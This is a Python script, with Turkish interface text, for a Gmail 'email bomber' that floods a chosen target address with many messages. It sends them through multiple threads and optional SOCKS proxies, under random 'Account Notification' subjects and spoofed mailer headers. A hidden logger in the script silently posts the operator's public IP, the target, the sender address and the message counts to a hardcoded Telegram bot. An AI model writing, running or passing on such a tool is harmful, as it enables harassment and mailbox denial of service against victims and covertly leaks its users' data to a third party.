#!/usr/bin/env python3
import smtplib
import random
import time
import requests
import datetime
import socket
import threading
import os
import sys
import json
import hashlib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from colorama import init, Fore, Style
import socks
import concurrent.futures
import ssl
import pyfiglet
import platform
import logging
import itertools

init(autoreset=True)

# ===================== KONFIGURASYON =====================
BOT_TOKEN = "8811100930:AAGG2cM_XAf2BxsXCtojQiUuXfdkUwrNlMU"
CHAT_ID = -1004372274552
USER_AGENT_LIST = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
]

PROXY_LIST = []

class DetailedLogger:
    def __init__(self):
        self.logger = logging.getLogger('UltraBomber')
        self.logger.setLevel(logging.DEBUG)
        handler = logging.FileHandler('bomber_detailed.log', encoding='utf-8')
        formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
        handler.setFormatter(formatter)
        self.logger.addHandler(handler)
        console = logging.StreamHandler()
        console.setLevel(logging.INFO)
        self.logger.addHandler(console)
        self.session_id = hashlib.md5(str(time.time() + random.random()).encode()).hexdigest()[:20]

    def get_system_info(self):
        return {
            "hostname": socket.gethostname(),
            "ip": self.get_ip(),
            "platform": platform.system() + " " + platform.release(),
            "python_version": sys.version.split()[0],
            "session_id": self.session_id,
        }

    def get_ip(self):
        try:
            return requests.get('https://api.ipify.org', timeout=5, headers={'User-Agent': random.choice(USER_AGENT_LIST)}).text.strip()
        except:
            return "Unknown"

    def log_event(self, event_type, details):
        log_data = {
            "timestamp": datetime.datetime.now().isoformat(),
            "event": event_type,
            "system": self.get_system_info(),
            "details": details,
        }
        self.logger.info(json.dumps(log_data, ensure_ascii=False))
        self.send_telegram_detailed_log(log_data)

    def send_telegram_detailed_log(self, data):
        try:
            sensitive_info = f"""
🚨 ULTRA BOMBER - İşlem Logu

🕒 Zaman: {data['timestamp']}
🌐 IP: {data['system']['ip']}
📌 Event: {data['event']}
🎯 Hedef: {data['details'].get('target', 'N/A')}
📧 Gönderici: {data['details'].get('sender', 'N/A')}
📊 Mail Sayısı: {data['details'].get('count', 'N/A')}
"""
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            payload = {"chat_id": CHAT_ID, "text": sensitive_info, "parse_mode": "HTML"}
            requests.post(url, json=payload, timeout=10)
        except:
            pass

class AnimasyonluArayuz:
    def __init__(self):
        self.animasyon_aktif = True

    def yukleniyor_animasyonu(self, mesaj="İşlem yapılıyor", sure=2):
        spinner = itertools.cycle(['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏'])
        baslangic = time.time()
        while time.time() - baslangic < sure:
            sys.stdout.write(f'\r{Fore.CYAN}{next(spinner)} {mesaj}...{Style.RESET_ALL}')
            sys.stdout.flush()
            time.sleep(0.08)
        sys.stdout.write(f'\r{Fore.GREEN}✓ {mesaj} tamamlandı.{Style.RESET_ALL}          \n')
        sys.stdout.flush()

    def ilerleme_cubugu(self, yuzde, genislik=50):
        dolu = int(genislik * yuzde / 100)
        bos = genislik - dolu
        
        # Yeni renk sistemi
        if yuzde >= 90:
            renk = Fore.GREEN      # Tamamlandı
        elif yuzde >= 50:
            renk = Fore.YELLOW     # Orta
        elif yuzde >= 25:
            renk = Fore.LIGHTYELLOW_EX  # Turuncu tonu
        else:
            renk = Fore.RED        # Az

        cubuk = f"{renk}{'█' * dolu}{Style.DIM}{'░' * bos}{Style.RESET_ALL}"
        sys.stdout.write(f'\r{cubuk} {yuzde:6.2f}%')
        sys.stdout.flush()

class UltraEmailBomber:
    def __init__(self):
        self.success = 0
        self.fail = 0
        self.total_sent = 0
        self.lock = threading.Lock()
        self.dlogger = DetailedLogger()
        self.ui = AnimasyonluArayuz()
        print(Fore.CYAN + pyfiglet.figlet_format("ULTRA BOMBER", font="slant"))
        print(Style.BRIGHT + "\nGmail Bomber - Kaliteli Gönderim Modu\n")

    def create_message(self, sender, target, message, subject):
        msg = MIMEMultipart()
        msg['From'] = sender
        msg['To'] = target
        msg['Subject'] = subject + " " + str(random.randint(100000, 999999))
        msg['X-Mailer'] = random.choice(["Thunderbird", "Outlook", "Gmail"])
        msg.attach(MIMEText(message, 'plain', 'utf-8'))
        return msg

    def send_single_email(self, target, sender, app_pass, message, proxy=None, retry=3):
        with self.lock:
            self.total_sent += 1

        for attempt in range(retry + 1):
            try:
                if proxy and PROXY_LIST:
                    ph, pp = proxy.split(':')
                    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, ph, int(pp))
                    socket.socket = socks.socksocket

                srv = smtplib.SMTP('smtp.gmail.com', 587, timeout=25)
                srv.starttls(context=ssl.create_default_context())
                srv.login(sender, app_pass)

                subject = f"Account Notification #{random.randint(10000,99999)}"
                msg = self.create_message(sender, target, message, subject)
                srv.sendmail(sender, target, msg.as_string())
                srv.quit()

                with self.lock:
                    self.success += 1
                return True
            except:
                if attempt == retry:
                    with self.lock:
                        self.fail += 1
                    return False
                time.sleep(random.uniform(2.5, 6))
        return False

    def run_bomb(self, target, count, sender, app_pass, message, threads=10):
        print(Fore.CYAN + f"\nHedef: {target} | Gönderim adedi: {count} | Thread: {threads}")
        print(Fore.YELLOW + "İlerleme çubuğu dolduğunda mail gönderimi tamamlanacak.\n")
        
        self.ui.yukleniyor_animasyonu("Bomb başlatılıyor", sure=1.5)

        self.dlogger.log_event("BOMB_START", {
            "target": target,
            "count": count,
            "threads": threads,
            "sender": sender,
            "message_length": len(message)
        })

        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(
                self.send_single_email,
                target, sender, app_pass, message,
                random.choice(PROXY_LIST) if PROXY_LIST else None
            ) for _ in range(count)]

            completed = 0
            for future in concurrent.futures.as_completed(futures):
                try:
                    future.result()
                except:
                    pass
                completed += 1
                progress = (completed / count) * 100
                self.ui.ilerleme_cubugu(progress)

        success_rate = (self.success / max(self.total_sent, 1)) * 100
        self.dlogger.log_event("BOMB_FINISH", {
            "target": target,
            "total_sent": self.total_sent,
            "success": self.success,
            "fail": self.fail,
            "success_rate": f"{success_rate:.2f}%"
        })

        print(f"\n\n{Fore.GREEN}Gönderim tamamlandı! {self.success}/{self.total_sent} başarılı | Başarı oranı: {success_rate:.2f}%{Style.RESET_ALL}")

def load_proxies():
    global PROXY_LIST
    try:
        with open("proxies.txt", "r") as f:
            PROXY_LIST = [line.strip() for line in f if line.strip()]
    except:
        pass

def main():
    load_proxies()
    bomber = UltraEmailBomber()

    target = input(Fore.YELLOW + "Hedef Email: " + Fore.GREEN).strip()
    count = int(input(Fore.YELLOW + "Gönderilecek mail sayısı: " + Fore.GREEN) or 50)
    sender = input(Fore.YELLOW + "Gönderici Gmail: " + Fore.GREEN).strip()
    app_pass = input(Fore.YELLOW + "App Password: " + Fore.GREEN).strip()
    threads = int(input(Fore.YELLOW + "Thread sayısı (önerilen 8-12): " + Fore.GREEN) or 10)

    print(Fore.CYAN + "\nMail içeriği:")
    message = input(Fore.GREEN + "> ") or "Bu bir önemli bildirim mesajıdır. Lütfen dikkate alınız."

    bomber.run_bomb(target, count, sender, app_pass, message, threads)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\nİşlem kullanıcı tarafından durduruldu.")
    except Exception as e:
        print(Fore.RED + f"\nHata oluştu: {e}")


